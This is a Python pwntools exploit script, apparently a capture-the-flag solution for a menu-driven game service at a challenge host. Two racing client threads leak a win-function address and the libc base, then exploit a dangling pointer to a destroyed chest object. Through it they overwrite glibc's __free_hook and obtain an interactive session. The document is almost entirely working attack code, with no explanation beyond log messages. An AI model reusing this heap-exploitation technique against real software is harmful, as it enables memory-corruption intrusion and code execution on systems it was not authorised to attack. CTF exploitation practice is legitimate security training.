from pwn import *
import threading, time

HOST = "node2.dynchal.p23.tw"
PORT = 25850

sig = -1
libc = -1
win = -1

def lottery(r):
    r.sendlineafter(b">", b"6")
    r.sendafter(b">", b"\x00")


def putblock_vip(r, mapx, mapy, t):
    r.sendlineafter(b">", b"1")
    r.sendlineafter(b">", str(mapx).encode())
    r.sendlineafter(b">", str(mapy).encode())
    r.sendlineafter(b">", str(t).encode())

def server():
    r = process("./chal")

def client01():
    global sig, libc, win

    #r = remote("0.0.0.0", 8080)
    r = remote(HOST, PORT)

    info("[Thread-1] Register and leak win function address")
    win = int(r.recvline().decode().split(">")[1], 16)
    success("[c1] win -> %s"%hex(win))

    r.sendlineafter(b">", b"c01");

    info("[Thread-1] Leak libc base")
    lottery(r)
    libc = int(r.recvlines(2)[1].decode().split(">")[1], 16) - 0x61c90
    success("[c1] libc -> %s"%hex(libc))

    info("[Thread-1] Put 10m blocks into chest")
    putblock_vip(r, 0, 0, 2) # put a chest

    # push 10m blocks into chest
    r.sendlineafter(b">", b"4")
    r.sendlineafter(b">", b"0")
    r.sendlineafter(b">", b"0")
    r.sendlineafter(b">", b"2")
    r.sendlineafter(b">", b"10000000")

    # new block and destory it
    putblock_vip(r, 1, 0, 1)
    r.sendlineafter(b">", b"3")
    r.sendlineafter(b">", b"1")
    r.sendlineafter(b">", b"0")

    info("[Thread-1] Destory chest")
    # destory block
    r.sendlineafter(b">", b"3")
    r.sendlineafter(b">", b"0")
    r.sendlineafter(b">", b"0")

    sig = 1 # client2 to get ref

    while not (sig == 2): pass
    info("[Thread-1] Write win function address to free_hook")
    for i in range(7):
        putblock_vip(r, i, 2, 1)
    # write free_hook
    r.sendlineafter(b">", b"4")
    r.sendlineafter(b">", b"6")
    r.sendlineafter(b">", b"2")
    r.sendlineafter(b">", b"1")
    r.sendlineafter(b">", p64(win))
    time.sleep(1)

    sig = 3

    info("[Thread-1] Good bye")
    r.close()

def client02():
    global sig

    #r = remote("0.0.0.0", 8080)
    r = remote(HOST, PORT)

    r.recvline()
    r.sendlineafter(b">", b"c02")

    while not (sig == 1): pass

    # get chest
    info("[Thread-2] Get chest dangling pointer")
    r.sendlineafter(b">", b"2") # choice
    r.sendlineafter(b">", b"0") # x
    r.sendlineafter(b">", b"0") # y
    r.sendlineafter(b">", b"1") # backpack slot

    time.sleep(20)

    # put it into map
    info("[Thread-2] Get a chunk on free_hook")
    r.sendlineafter(b">", b"1") # choice
    r.sendlineafter(b">", b"0") # x
    r.sendlineafter(b">", b"0") # y
    r.sendlineafter(b">", b"1") # backpack slot

    # rename
    r.sendlineafter(b">", b"4")
    r.sendlineafter(b">", b"0")
    r.sendlineafter(b">", b"0")
    r.sendlineafter(b">", b"1")
    freehook = libc + 0x1eee48
    r.sendafter(b">", p64(freehook))

    sig = 2
    while not (sig == 3): pass

    info("[Thread-2] Win")

    r.sendlineafter(b">", b"3")
    r.sendlineafter(b">", b"0")
    r.sendlineafter(b">", b"2")

    r.interactive()

#threading.Thread(target=server).start()
threading.Thread(target=client01).start()
threading.Thread(target=client02).start()